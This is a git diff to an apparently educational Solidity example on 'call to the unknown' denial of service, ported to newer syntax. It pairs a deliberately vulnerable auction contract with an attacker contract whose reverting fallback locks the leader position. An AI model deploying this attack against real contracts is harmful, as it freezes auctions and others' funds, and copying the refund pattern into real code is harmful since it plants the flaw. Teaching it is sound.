@@ -1,31 +1,36 @@
 ## Call to the Unknown (DoS with unexpected revert)
 
 ```solidity
-pragma solidity ^0.4.18;
-// This Contract is Vulnerable for dods attack
+pragma solidity ^0.8.12;
 contract CallToTheUnknown {
   // Highest bidder becomes the Leader. 
   // Vulnerable to DoS attack by an attacker contract which reverts all transactions to it.
 
-    address currentLeader;
-    uint highestBid;
+    address public currentLeader;
+    uint public highestBid;
 
-    function() payable {
+    fallback() external payable {
         require(msg.value > highestBid);
-        require(currentLeader.send(highestBid)); // Refund the old leader, if it fails then revert, This will revert and it will fail becasue attacker contract have revert function in payable function
+        require(payable(currentLeader).send(highestBid)); // Refund the old leader, if it fails then revert
         currentLeader = msg.sender;
         highestBid = msg.value;
     }
 }
 
 contract Pwn {
-  // call become leader 
-  function becomeLeader(address _address, uint bidAmount) {
-    _address.call.value(bidAmount);
+  // call become leader
+  // CallToTheUnknown  calltotheunknown;
+  //   constructor(address addr)  {
+  //       calltotheunknown = CallToTheUnknown(payable(addr));
+  //   }
+
+  function becomeLeader(address payable addr) payable external{
+      (bool sent, ) = addr.call{value: msg.value}("");
+      require(sent, "Failed to send Ether");
   }
     
-  // reverts anytime it receives ether, thus cancelling out the change of the leader and this will make the victim account under ddos attack
-  function() payable {
+  // reverts anytime it receives ether, thus cancelling out the change of the leader
+  fallback() payable external {
     revert();
   }
 }
